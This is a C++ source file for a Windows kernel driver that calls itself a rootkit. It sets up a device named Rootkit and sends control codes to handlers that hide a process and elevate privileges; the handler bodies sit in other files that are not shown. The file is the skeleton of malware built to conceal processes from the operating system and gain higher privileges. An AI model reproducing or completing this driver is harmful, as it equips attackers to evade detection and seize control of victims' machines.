#include <Ntifs.h>
#include "Ioctl.h"
#include <Ntstrsafe.h>
#include "ioctl_handlers.h"
#include "token_info.h"

void RootkitUnload(_In_ PDRIVER_OBJECT DriverObject);

NTSTATUS RootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS RootkitDeviceControl(PDEVICE_OBJECT, PIRP Irp);

NTSTATUS UnlinkActiveProcessLinks(ULONG pid);

extern "C" NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	KdPrint(("Rootkit DriverEntry started\n"));

	DriverObject->DriverUnload = RootkitUnload;

	DriverObject->MajorFunction[IRP_MJ_CREATE] = RootkitCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = RootkitCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = RootkitDeviceControl;

	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\Rootkit");

	PDEVICE_OBJECT DeviceObject;

	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create device (0x%08X)\n", status));
		return status;
	}

	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Rootkit");
	status = IoCreateSymbolicLink(&symLink, &devName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create symbolic link (0x%08X)\n", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	DriverObject->Flags &= ~DO_DEVICE_INITIALIZING;
	DeviceObject->Flags |= DO_BUFFERED_IO;



	KdPrint(("Rootkit DriverEntry completed successfully\n"));

	return STATUS_SUCCESS;
}

void RootkitUnload(_In_ PDRIVER_OBJECT DriverObject) {


	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Rootkit");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint(("Rootkit unloaded\n"));
}


NTSTATUS RootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);


	KdPrint(("Rootkit create/close\n"));

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);


	return STATUS_SUCCESS;
}


NTSTATUS RootkitDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_SUCCESS;

	switch (static_cast<RookitIoctls>(stack->Parameters.DeviceIoControl.IoControlCode)) {

	case RookitIoctls::HideProcces:

		status = IoctlHandlers::HandleHideProcess(Irp);
		break;

	case RookitIoctls::TestConnection:

		status = IoctlHandlers::HandleTestConnection(Irp, stack->Parameters.DeviceIoControl.OutputBufferLength);
		break;

	case RookitIoctls::Elevate:

		status = IoctlHandlers::HandleElevate(Irp);
		break;
	default:
		Irp->IoStatus.Information = 0;
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;

	}

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}
